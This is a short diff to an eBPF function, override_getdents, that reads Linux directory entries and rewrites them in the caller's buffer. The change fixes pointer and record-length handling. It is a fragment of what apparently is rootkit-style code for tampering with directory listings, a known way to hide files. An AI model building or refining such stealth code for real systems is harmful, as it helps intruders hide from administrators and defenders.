@@ -92,9 +92,12 @@ int override_getdents(struct pt_regs *ctx)
 
                 bpf_probe_read(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
 
-                int remains = reclen - sizeof(struct linux_dirent64);
+                int remains = src.d_reclen - sizeof(struct linux_dirent64);
                 // currenlty doesn't support file longer than 220
                 copy((void *)getdents->dirent + sizeof(struct linux_dirent64), buff, remains);
+
+                getdents->src = (void *)getdents->src + src.d_reclen;
+                reclen = src.d_reclen;
             }
 
             getdents->dirent = (void *)getdents->dirent + reclen;
